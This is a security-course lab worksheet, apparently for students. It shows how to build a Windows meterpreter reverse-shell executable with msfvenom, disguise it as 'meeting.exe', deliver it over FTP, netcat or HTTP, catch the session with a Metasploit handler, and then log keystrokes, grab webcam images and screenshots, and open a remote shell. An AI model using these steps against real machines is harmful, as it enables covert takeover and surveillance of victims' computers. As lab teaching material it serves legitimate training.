# Creating Malware with Metasploit

## Description
- [Metasploit](https://www.metasploit.com/) can be used to create malware
- Users who run that malware surrender control of their computers


## Equipments
- Both the Kali Linux VM 🐧 and the Windows server VM 🪟

## Tasks

On Kali Linux VM, 🐧, in a command terminal,

1. Create a malware with msfvenom

```bash
# 1.1 find the usage of msfvenom
msfvenom -h

# 1.2 create a malware
msfvenom -p windows/meterpreter/reverse_tcp LHOST=Kali_VM_IP -f exe > meeting.exe

# 1.3 use ftp upload this meeting.exe onto Windows server

# 1.4 set up the attack with msfconsole
# 1.4.1 run msfconsole
# ~$ terminal prompt, msf> msfconsole prompt
~$ msfconsole
msf > help

# 1.4.2 start a command-and-control (C&C) server
msf > use multi/handler
msf > set PAYLOAD windows/meterpreter/reverse_tcp
msf > set LHOST 0.0.0.0
msf > exploit
```

On Windows server VM, 🪟

2. double-click meeting.exe to run it


On Kali Linux VM, 🐧, in the previous command terminal, if everything runs smoothly, a meterpreter session should open:

```bash
# 3. Use the meterpreter shell
meterpreter > help
# 3.1 try several commands, such as screenshot, webcam_stream, etc.

# 3.2 migrate to a different process, why should we?
# 3.2.1 list processes
meterpreter > ps

# 3.2.2 migrate to the winlogon process
meterpreter > migrate -N explorer.exe

# Note: if the migration fails, try these steps
meterpreter > exit
meterpreter > exploit
# restart Windows, log in, and run meeting.exe again
# on Kali, 
meterpreter > migrate -N explorer.exe
```

4. Post exploitation

On Kali Linux VM, 🐧 in the successful meterpreter session, 

4.1 try these commands

| command | usage |
| --- | --- |
| screenshot |	Gives you an image of the target's desktop |
| keyscan_start	| Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name. |
| keyscan_dump |	Shows the keystrokes captured so far |
| webcam_list |	Shows the available webcams (if any) |
| webcam_snap |	Takes a photo with the webcam |
| shell |	Gives you a Windows Command Prompt on the target |
| exit |	Leaves the Windows Command Prompt |

4.2 find the remote port number that the malware connected

```bash
meterpreter > netstat
```

**Optional**: file transfer method alternative to 1.3

- transfer files with netcat
- transfer files with HTTP

```bash
# 1.3.a  use netcat: netcat is available on Kali VM, 
# it is also installed on windows VM along the installation of zenmap
# On windows vm, in a command prompt, 
netcat -l 2023 > meeting.exe
# On Kali vm, in a command terminal, go to the folder where meeting.exe resides
netcat -w 2 Windows_VM_IP 2023 < meeting.exe

# 1.3.b use Python SimpleHTTPServer which is available on Kali VM,
# On Kali vm, in a command terminal, go to the folder where meeting.exe resides
python -m SimpleHTTPServer 80

# On windows vm, run Google Chrome browser, type the URL: http://Kali_VM_IP
# then download meeting.exe
```

# Reference
- [samsclass Project 4: Creating Infectious Media with Metasploit](https://samsclass.info/123/proj10/123p4msf.htm)
- [Use Netcat to Transfer Files](https://linuxhint.com/use-netcat-to-transfer-files/)
- [How to use Python SimpleHTTPServer](https://www.pythonforbeginners.com/modules-in-python/how-to-use-simplehttpserver)